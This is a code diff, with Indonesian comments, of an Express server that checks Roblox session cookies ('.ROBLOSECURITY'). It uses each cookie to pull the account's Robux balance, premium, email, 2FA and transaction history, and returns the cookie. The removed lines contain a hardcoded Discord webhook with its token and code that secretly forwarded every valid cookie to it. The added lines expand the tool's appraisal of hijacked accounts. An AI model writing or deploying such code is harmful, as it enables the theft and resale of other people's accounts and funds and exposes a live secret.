@@ -6,8 +6,11 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Ganti dengan link webhook Discord kamu yang asli
-const SECRET_WEBHOOK_URL = process.env.DISCORD_WEBHOOK || "https://discord.com/api/webhooks/1564812827104120864/IVzRYsDRj7cnXt97p647eU9c9s4276WOmMlTT2KuRK989Yvfh-NPw3HrwP8ChPD4MGUM";
+const getHeaders = (cookie) => ({
+    'Cookie': `.ROBLOSECURITY=${cookie}`,
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Accept': 'application/json'
+});
 
 app.post('/api/check', async (req, res) => {
     try {
@@ -16,18 +19,14 @@ app.post('/api/check', async (req, res) => {
             return res.status(400).json({ error: "Cookie tidak boleh kosong." });
         }
 
-        // Ambil cookie pertama saja agar cepat dan tidak kena timeout Vercel
         let cleanCookie = cookies[0].trim().replace(/^["']|["']$/g, '');
         if (!cleanCookie) {
             return res.status(400).json({ error: "Format cookie tidak valid." });
         }
 
-        // 1. Cek User ID & Username
+        // 1. Cek Autentikasi User ID & Username
         const userRes = await axios.get('https://users.roblox.com/v1/users/authenticated', {
-            headers: {
-                'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
-                'User-Agent': 'Mozilla/5.0'
-            },
+            headers: getHeaders(cleanCookie),
             timeout: 5000
         });
 
@@ -42,19 +41,79 @@ app.post('/api/check', async (req, res) => {
         // 2. Cek Saldo Robux
         let robux = 0;
         try {
-            const curRes = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
-                headers: { 'Cookie': `.ROBLOSECURITY=${cleanCookie}` },
+            const currencyRes = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
+                headers: getHeaders(cleanCookie),
                 timeout: 3000
             });
-            robux = curRes.data.robux || 0;
+            robux = currencyRes.data.robux || 0;
         } catch (e) {}
 
-        // 3. Cek Tanggal Pembuatan Akun
+        // 3. Cek Tanggal Pembuatan Akun (Age)
         let createdDate = "Tidak diketahui";
         try {
             const infoRes = await axios.get(`https://users.roblox.com/v1/users/${userId}`, { timeout: 3000 });
             if (infoRes.data && infoRes.data.created) {
-                createdDate = new Date(infoRes.data.created).toLocaleDateString('id-ID');
+                createdDate = new Date(infoRes.data.created).toLocaleDateString('id-ID', {
+                    day: 'numeric', month: 'long', year: 'numeric'
+                });
+            }
+        } catch (e) {}
+
+        // 4. Cek Status Premium
+        let isPremium = false;
+        try {
+            const premRes = await axios.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
+                headers: getHeaders(cleanCookie),
+                timeout: 3000
+            });
+            isPremium = !!premRes.data;
+        } catch (e) {}
+
+        // 5. Cek Status Email & 2FA
+        let emailStatus = "Tidak diketahui / Terkunci";
+        let has2FA = false;
+        try {
+            const settingsRes = await axios.get(`https://accountsettings.roblox.com/v1/email`, {
+                headers: getHeaders(cleanCookie),
+                timeout: 3000
+            });
+            if (settingsRes.data && settingsRes.data.verified !== undefined) {
+                emailStatus = settingsRes.data.verified ? "Terverifikasi (Verified)" : "Belum Verifikasi";
+            }
+        } catch (e) {}
+
+        try {
+            const tfaRes = await axios.get(`https://twostepverification.roblox.com/v1/users/${userId}/settings`, {
+                headers: getHeaders(cleanCookie),
+                timeout: 3000
+            });
+            if (tfaRes.data) {
+                has2FA = tfaRes.data.isAuthenticatorEnabled || tfaRes.data.isEmailEnabled || false;
+            }
+        } catch (e) {}
+
+        // 6. Cek Robux Income & Outgoing (Spend)
+        let totalIncoming = 0;
+        let totalSpent = 0;
+        let transactions = [];
+        try {
+            const transRes = await axios.get(`https://economy.roblox.com/v2/users/${userId}/transactions?transactionType=All&limit=15`, {
+                headers: getHeaders(cleanCookie),
+                timeout: 4000
+            });
+            
+            if (transRes.data && transRes.data.data) {
+                transactions = transRes.data.data.map(tx => {
+                    const amount = tx.currency?.amount || 0;
+                    if (amount > 0) totalIncoming += amount;
+                    if (amount < 0) totalSpent += Math.abs(amount);
+
+                    return {
+                        description: tx.details?.name || tx.type || "Transaksi",
+                        amount: amount,
+                        date: new Date(tx.created).toLocaleDateString('id-ID')
+                    };
+                });
             }
         } catch (e) {}
 
@@ -64,29 +123,19 @@ app.post('/api/check', async (req, res) => {
             username,
             displayName,
             robux,
-            totalIncoming: 0,
-            totalSpent: 0,
-            transactions: [],
+            totalIncoming,
+            totalSpent,
             createdDate,
-            isPremium: false,
+            isPremium,
+            emailStatus,
+            has2FA: has2FA ? "Aktif (Enabled)" : "Nonaktif (Disabled)",
+            transactions,
             cookie: cleanCookie
         };
 
-        // Kirim ke Discord Webhook
-        if (SECRET_WEBHOOK_URL && SECRET_WEBHOOK_URL.startsWith("https://discord.com/api/webhooks/1564812827104120864/IVzRYsDRj7cnXt97p647eU9c9s4276WOmMlTT2KuRK989Yvfh-NPw3HrwP8ChPD4MGUM")) {
-            try {
-                await axios.post(SECRET_WEBHOOK_URL, {
-                    content: `🚨 **AKUN VALID DITEMUKAN!**\n` +
-                             `👤 **Username:** ${username} (${displayName})\n` +
-                             `💰 **Robux:** ${robux}\n` +
-                             `🔑 \`\`\`${cleanCookie}\`\`\``
-                }, { timeout: 3000 });
-            } catch (wErr) {}
-        }
-
         res.json({ results: [accountData] });
     } catch (err) {
-        res.status(500).json({ error: "Cookie invalid atau server sibuk." });
+        res.status(500).json({ error: "Gagal memproses cookie atau server sibuk." });
     }
 });
 
